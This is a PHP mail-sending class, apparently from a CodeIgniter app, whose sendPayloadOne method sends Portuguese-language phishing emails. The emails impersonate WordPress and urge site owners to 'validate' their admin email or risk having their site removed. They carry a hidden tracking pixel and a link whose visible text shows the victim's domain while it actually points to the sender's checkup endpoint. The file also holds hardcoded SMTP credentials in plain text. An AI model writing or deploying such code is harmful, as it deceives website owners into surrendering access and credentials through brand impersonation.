

<?php

// use PHPMailer\PHPMailer\PHPMailer;
// use PHPMailer\PHPMailer\SMTP;
// use PHPMailer\PHPMailer\Exception;


require './vendor/autoload.php';


require("./PHPMailer-master/src/PHPMailer.php");
require("./PHPMailer-master/src/SMTP.php");

class email_model extends CI_Model
{

    public function __construct()
    {

        parent::__construct();
    }

    public function sendPayloadOne($alvo_url, $alvo_email, $alvo_nome, $alvo_ref)
    {


        try {

            $mail = new PHPMailer\PHPMailer\PHPMailer();
            $mail->IsSMTP(); // enable SMTP
            $mail->CharSet = "UTF-8";
            $mail->SMTPDebug = false; // debugging: 1 = errors and messages, 2 = messages only
            $mail->SMTPAuth = true; // authentication enabled
            $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
            $mail->Host = "smtp.hostinger.com";
            $mail->Port = 465; // or 587
            $mail->IsHTML(true);
            $mail->Username = "wordpress@wpvalidation.com";
            $mail->Password = "Effizienz10*";
            $mail->SetFrom("wordpress@wpvalidation.com", "WordPress");

            $mail->Subject = '[' . $alvo_nome . '] Validação de Segurança';

            $mail->AddAddress($alvo_email, $alvo_nome);


            $mail->Body  = '

            <!DOCTYPE html>
            <html>
            <head>
            
            </head>

            <body>
                    <center>
                        <img src="' . base_url() . 'checkup/email_ping?u=' . $alvo_url . '&e=' . $alvo_email . '"  width="1" height="1">
                    </center>
                    Para sua segurança, o wordpress rotineiramente precisa validar os e-mails associados ao dominio. <a href="https://make.wordpress.org/core/2019/10/17/wordpress-5-3-admin-email-verification-screen/#post-64977">Saiba mais</a>. <br><br>
                                        
                    O e-mail <b>' . $alvo_email . '</b> está associado ao site <b>' . $alvo_url . '</b>?<br><br>

                    Essa validação é importante para evitar que seu site seja removido ou penalizado.<br><br>

                    Acesse o link abaixo para concluir validação:<br><br>

                    <a href="' . base_url() . 'checkup?u=' . $alvo_url . '&e=' . $alvo_email . '&a=' . $alvo_nome . '">https://' . $alvo_url . '/validation=' . $alvo_email . '</a>
                    <br><br>
                    Ou cole direto no navegador: <br><br>
                    ' . base_url() . 'checkup/verification/' . $alvo_ref . '

                </body>
                
            </html>




            

                  

                    
               ';

            if ($mail->Send()) {
                return true;
            } else {
                return false;
            }
        } catch (Exception $e) {
            return false;
        }
    }
}
